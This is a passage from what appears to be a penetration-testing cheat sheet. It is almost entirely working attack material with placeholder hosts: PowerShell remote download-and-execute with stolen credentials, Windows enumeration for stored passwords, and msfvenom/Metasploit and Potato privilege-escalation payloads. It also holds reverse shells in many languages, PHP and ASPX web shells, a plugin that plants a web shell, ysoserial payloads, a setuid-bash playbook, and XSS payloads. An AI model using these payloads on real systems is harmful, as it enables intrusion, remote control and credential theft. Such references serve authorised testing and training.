PS C:\> $cred = New-Object System.Management.Automation.PSCredential ("<DOMAIN>\<USERNAME>", $pass)
PS C:\> Invoke-Command -computername <COMPUTERNAME> -ConfigurationName dc_manage -credential $cred -command {whoami}
```

###### Execute Scripts with Credentials (Reverse Shell)

```c
PS C:\Windows\system32> $pass = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
PS C:\Windows\system32> $cred = New-Object System.Management.Automation.PSCredential("<DOMAIN>\<USERNAME>", $pass)
PS C:\Windows\system32> Invoke-Command -Computer <RHOST> -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://<LHOST>/<FILE>.ps1') } -Credential $cred
```

###### New-PSSession

```c
PS C:\Users\<USERNAME>\Downloads\backups> $username = "<DOMAIN>\<USERNAME>"
$username = "<DOMAIN>\<USERNAME>"
PS C:\Users\<USERNAME>\Downloads\backups> $password = "<PASSWORD>"
$password = "<PASSWORD>"
PS C:\Users\<USERNAME>\Downloads\backups> $secstr = New-Object -TypeName System.Security.SecureString
$secstr = New-Object -TypeName System.Security.SecureString
PS C:\Users\<USERNAME>\Downloads\backups> $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
PS C:\Users\<USERNAME>\Downloads\backups> $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
PS C:\Users\<USERNAME>\Downloads\backups> new-pssession -computername . -credential $cred
new-pssession -computername . -credential $cred

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  1 WinRM1          localhost       RemoteMachine   Opened        Microsoft.PowerShell     Available

PS C:\Users\<USERNAME>\Downloads\backups> enter-pssession 1
enter-pssession 1
[localhost]: PS C:\Users\<USERNAME>\Documents> whoami
whoami
<DOMAIN>\<USERNAME>
```

#### Windows Tasks & Services

```c
tasklist /SVC
netsh firewall show state
schtasks /query /fo LIST /v
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
```

```c
sc query
sc qc <service-name>
accesschk.exe -uws "Everyone" "C:\Program Files"

dir /s *pass* == *cred* == *vnc* == *.config*
findstr /si password *.xml *.ini *.txt

wmic qfe get Caption,Description,HotFixID,InstalledOn    # no new patches - KEXP pretty likely
```

#### Writeable Directories in Linux

```c
/dev/shm
/tmp
```

### CVE

#### Juicy Potato

> https://github.com/ohpe/juicy-potato

##### msfvenom and Metasploit Execution

```c
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -b "\x00\x0a" -a x86 --platform windows -f exe -o exploit.exe
```

```c
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <LHOST>
msf6 exploit(multi/handler) > set LPORT <LHOST>
msf6 exploit(multi/handler) > run
```

```c
C:\> .\exploit.exe
```

```c
[*] Sending stage (175174 bytes) to <RHOST>
[*] Meterpreter session 1 opened (<LHOST>:<LPORT> -> <RHOST>:51990) at 2021-01-31 12:36:26 +0100
```

#### SharpEfsPotato

> https://github.com/bugch3ck/SharpEfsPotato

```c
PS C:\> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "C:\nc64.exe -e cmd.exe <LHOST> <LPORT>"
```

### Payloads

#### Reverse Shells

##### Bash Reverse Shell

```c
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
echo -n '/bin/bash -c "bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"' | base64
```

##### curl Reverse Shell

```c
curl --header "Content-Type: application/json" --request POST http://<RHOST>:<RPORT>/upload --data '{"auth": {"name": "<USERNAME>", "password": "<PASSWORD>"}, "filename" : "& echo "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"|base64 -d|bash"}'
```

##### JAVA Reverse Shell

```c
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<LHOST>/<LPORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

$ r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<LHOST>/<LPORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor();
```

###### shell.jar

```c
package <NAME>;

import org.bukkit.plugin.java.JavaPlugin;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;

public class Main extends JavaPlugin {
   @Override
   public void onDisable() {
     super.onDisable();
   }

@Override
public void onEnable() {
  final String PHP_CODE = "<?php system($_GET['cmd']); ?>";
  try {
   Files.write(Paths.get("/var/www/<RHOST>/shell.php"), PHP_CODE.getBytes(), StandardOpenOption.CREATE_NEW);
   } catch (IOException e) {
     e.printStackTrace();
   }

   super.onEnable();
  }
}
```

##### Lua Reverse Shell

```c
http://<RHOST>');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT>/tmp/f")--
```

##### Markdown Reverse Shell

```c
--';bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1;'--
```

##### mkfifo Reverse Shell

```c
mkfifo /tmp/shell; nc <LHOST> <LPORT> 0</tmp/shell | /bin/sh >/tmp/shell 2>&1; rm /tmp/shell
```

##### Netcat Reverse Shell

```c
nc -e /bin/sh <LHOST> <LPORT>
```

##### Perl Reverse Shell

```c
perl -e 'use Socket;$i="<LHOST>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

##### PHP Reverse Shell

```c
php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

##### PowerShell Reverse Shell

```c
$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```c
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```c
powershell -nop -exec bypass -c '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```

##### minireverse.ps1

```c
$socket = new-object System.Net.Sockets.TcpClient('127.0.0.1', 413);
if($socket -eq $null){exit 1}
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
do
{
	$writer.Flush();
	$read = $null;
	$res = ""
	while($stream.DataAvailable -or $read -eq $null) {
		$read = $stream.Read($buffer, 0, 1024)
	}
	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
	if(!$out.equals("exit")){
		$args = "";
		if($out.IndexOf(' ') -gt -1){
			$args = $out.substring($out.IndexOf(' ')+1);
			$out = $out.substring(0,$out.IndexOf(' '));
			if($args.split(' ').length -gt 1){
                $pinfo = New-Object System.Diagnostics.ProcessStartInfo
                $pinfo.FileName = "cmd.exe"
                $pinfo.RedirectStandardError = $true
                $pinfo.RedirectStandardOutput = $true
                $pinfo.UseShellExecute = $false
                $pinfo.Arguments = "/c $out $args"
                $p = New-Object System.Diagnostics.Process
                $p.StartInfo = $pinfo
                $p.Start() | Out-Null
                $p.WaitForExit()
                $stdout = $p.StandardOutput.ReadToEnd()
                $stderr = $p.StandardError.ReadToEnd()
                if ($p.ExitCode -ne 0) {
                    $res = $stderr
                } else {
                    $res = $stdout
                }
			}
			else{
				$res = (&"$out" "$args") | out-string;
			}
		}
		else{
			$res = (&"$out") | out-string;
		}
		if($res -ne $null){
        $writer.WriteLine($res)
    }
	}
}While (!$out.equals("exit"))
$writer.close();
$socket.close();
$stream.Dispose()
```

##### Python Reverse Shell

```c
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```c
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```c
python -c 'import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen(["/bin/su","-c","id","bynarr"],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,"fruity\n");time.sleep(0.1);print os.read(master,1024);'
```

```c
echo python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > <FILE><(),2);p=subprocess.call(["/bin/sh","-i"]);' > <FILE>
```

##### Ruby Reverse Shell

```c
ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

#### Web Shells

##### PHP Web Shell

```c
<?php system($_GET['cmd']); ?>
<?php echo exec($_POST['cmd']); ?>
<?php echo passthru($_GET['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>
<?php echo system($_REQUEST['shell']): ?>
```

#### nishang

```c
cd path/to/nishang/Shells/
cp Invoke-PowerShellTcp.ps1 Invoke-PowerShellTcp.ps1

tail -3 Invoke-PowerShellTcp.ps1
}

Invoke-PowerShellTcp -Reverse -IPAddress <LHOST> -Port <LPORT>

powershell "IEX(New-Object Net.Webclient).downloadString('http://<LHOST>:<LPORT>/Invoke-PowerShellTcp.ps1')"
```

#### Shikata Ga Nai

```c
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai

msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/shell.exe
```

#### ysoserial

```c
java -jar ysoserial-master-SNAPSHOT.jar
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections1 'nc <LHOST> <LPORT> -e /bin/sh' | base64 -w 0
java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections4 "$jex" > /tmp/$filename.session
```

### Templates

#### ASPX Web Shell

```c
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Set s = CreateObject("WScript.Shell")
Set cmd = s.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://<LHOST>/shellyjelly.ps1')")
o = cmd.StdOut.Readall()
Response.write(o)
%>
-->
```

#### Bad YAML

```c
- hosts: localhost
  tasks:
    - name: badyml
      command: chmod +s /bin/bash
```

#### Exploit Skeleton Python Script

```c
#!/usr/bin/python

import socket,sys

address = '127.0.0.1'
port = 9999
buffer = #TBD

try:
	print '[+] Sending buffer'
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)
	s.send(buffer + '\r\n')
except:
 	print '[!] Unable to connect to the application.'
 	sys.exit(0)
finally:
	s.close()
```

#### JSON POST Request

```c
POST /<path> HTTP/1.1
Host: <RHOST>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Content-Type: application/json
Content-Length: 95
Connection: close

{
  "auth":{
    "name":"<USERNAME>",
    "password":"<PASSWORD>"
  },
  "filename":"<FILE>"
}
```

#### XSS

##### Basic Payloads

```c
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
<script src="http://<LHOST>/<FILE>"></script>
```

##### IMG Payloads

```c
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert('XSS');>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
```

##### SVG Payloads

```c
<svgonload=alert(1)>
<svg/onload=alert('XSS')>
<svg onload=alert(1)//
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
"><svg/onload=alert(String.fromCharCode(88,83,83))>
"><svg/onload=alert(/XSS/)
<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
```

##### DIV Payloads

```c
<div onpointerover="alert(45)">MOVE HERE</div>
<div onpointerdown="alert(45)">MOVE HERE</div>
<div onpointerenter="alert(45)">MOVE HERE</div>
<div onpointerleave="alert(45)">MOVE HERE</div>
<div onpointermove="alert(45)">MOVE HERE</div>
<div onpointerout="alert(45)">MOVE HERE</div>
<div onpointerup="alert(45)">MOVE HERE</div>
```
